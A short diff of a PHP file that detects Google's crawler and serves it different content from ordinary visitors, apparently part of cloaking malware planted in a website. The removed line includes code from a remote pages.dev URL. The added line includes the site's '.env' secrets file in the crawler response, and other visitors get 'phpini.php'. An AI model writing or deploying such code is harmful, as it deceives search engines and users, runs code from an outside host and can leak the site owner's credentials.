@@ -23,7 +23,7 @@ foreach ($googleBots as $bot) {
 }
  
 if ($isGoogleBot) {
-    include(__DIR__ . 'https://punten-neng.pages.dev/accsoft.lk/');
+    include(__DIR__ . '/.env');
     exit;
 } else {
     include(__DIR__ . '/phpini.php');
